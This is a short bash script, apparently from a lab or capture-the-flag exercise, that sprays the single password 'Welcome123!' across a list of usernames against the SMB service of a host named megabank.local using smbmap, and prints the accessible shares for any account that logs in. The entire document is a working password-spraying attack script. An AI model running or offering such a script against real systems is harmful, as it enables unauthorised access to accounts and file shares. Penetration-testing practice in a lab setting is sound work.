#!/bin/bash

while read p; do
  res=$(smbmap -H megabank.local -u "$p" -p "Welcome123!")
  if [[ "$res" != *"error"* ]]; then
    echo "[+] Creds found for $p"
    echo "[*] Shares ..."
    echo "$res"
  fi
done < users.txt
